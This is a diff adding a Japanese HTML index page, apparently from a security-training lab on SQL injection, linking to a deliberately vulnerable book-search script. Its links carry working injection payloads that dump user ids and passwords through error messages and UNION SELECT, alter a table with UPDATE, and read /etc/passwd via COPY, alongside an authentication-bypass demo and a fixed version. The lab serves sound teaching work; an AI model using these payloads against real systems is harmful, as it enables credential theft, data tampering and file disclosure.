@@ -1,0 +1,24 @@
+<html>
+<head><title>4.4 SQL呼び出しに伴う脆弱性</title></head>
+<body>
+4.4 SQL呼び出しに伴う脆弱性
+<ol>
+<li><a href="44-001.php?author=Shakespeare">44-001:蔵書検索(正常系)</a></li>
+<li><a href="44-001.php?author='+and+cast((select+id||':'||pwd+from+users+offset+0+limit+1)+as+integer)>1--">44-001:蔵書検索(エラーメッセージからの情報漏洩)</a></li>
+<li><a href="44-001.php?author=author='+union+select+id,pwd,name,addr,null,null,null+from+users--">44-001:蔵書検索(UNION SELECTを用いた情報漏洩)</a></li>
+<li><a href="44-002.html">44-002:認証画面</a></li>
+<li><a href="44-002a.html">44-002:認証画面(正常系)</a></li>
+<li><a href="44-002b.html">44-002:認証画面(認証回避)</a></li>
+<li><a href="44-001.php?author=';update+books+set+title%3D'<i>cracked!</i>'+where+id%3d'1001'--">44-001:蔵書検索(データ改ざん)</a> <a href="44-001.php?author=Shakespeare">確認</a></li>
+<li><a href="44-001.php?author=';copy+books(title)+from+'/etc/passwd'--">44-001:蔵書検索(ファイル読み出し[1]ファイルの内容をテーブルに)</a></li>
+<li><a href="44-001.php?author='or+author+is+null--">44-001:蔵書検索(ファイル読み出し[2]テーブル参照)</a></li>
+<li><a href="44-004.php?author=Shakespeare">44-004:蔵書検索対策版(正常系)</a></li>
+<li><a href="44-004.php?author='+and+cast((select+id||':'||pwd+from+users+offset+0+limit+1)+as+integer)>1--">44-004:蔵書検索対策版(SQLインジェクション攻撃)</a></li>
+<li><a href="resetdb.php">resetdb:データベースの復旧</a></li>
+</ol>
+<br>
+<a href="phpinfo.php">phpinfo</a><br>
+<a href="/">ホームに戻る</a>
+</body>
+</html>
+
